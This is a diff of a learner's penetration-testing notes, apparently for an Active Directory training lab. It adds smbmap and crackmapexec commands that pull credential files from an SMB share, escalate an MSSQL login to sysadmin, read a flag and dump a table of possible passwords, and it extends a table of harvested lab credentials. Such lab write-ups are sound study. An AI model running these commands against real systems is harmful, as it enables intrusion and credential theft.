@@ -61,14 +61,62 @@ TODOS:
 
 ---
 
+*Command*: Extrackt all text file from smb
+-  proxychains4 smbmap -H 172.16.15.15 -u Atul -p 'hooters1' -r -A txt
+  
+*Result:* SQL01$::INLANEFREIGHT:hash
+- file 172.16.15.3-DEV_sql_dev_creds.txt  
+- sqldev:Sq!D3vUs3R
+  
+--- 
+
+*Command*: priv escalation with mssql
+- proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -M mssql_priv
+- proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -M mssql_priv -o ACTIO
+N=privesc
+
+*Result:* 
+- [+] sqldev can impersonate netdb (sysadmin)
+- [+] sqldev is now a sysadmin! (Pwn3d!)
+  
+--- 
+
+*Command*: Execute commands with the new user
+- proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -x 'type C:\Users\Public\flag.txt'
+
+ *Result:* Flag
+ 
+--- 
+
+*Command*: Read database interns
+-  proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -q "SELECT * FROM interns.dbo.details" > details.txt
+
+*Result:*  Extracted file with possible passwords
+  
+--- 
+
+*Command*: 
+ 
+*Result:* 
+
+--- 
+
+*Command*: 
+ 
+*Result:* 
+
+
+
 ### Credentials Found
-|   Username    | Password  |   Note   |
-| :-----------: | :-------: | :------: |
-|   Juliette    | Password1 | 1st flag |
-|     Atul      | hooters1  | kerbast  |
-|     james     |   None    |          |
-| svc_inlaneadm |   None    |          |
-|  svc_devadm$  |   None    |          |
+|   Username    |  Password  |    Note    |
+| :-----------: | :--------: | :--------: |
+|   Juliette    | Password1  |  1st flag  |
+|     Atul      |  hooters1  |  kerbast   |
+|    sqldev     | Sq!D3vUs3R | from share |
+|     james     |    None    |            |
+| svc_inlaneadm |    None    |            |
+|  svc_devadm$  |    None    |            |
+|  svc_devadm$  |    None    |            |
 
 ## Common Services
 ### Assessment 1
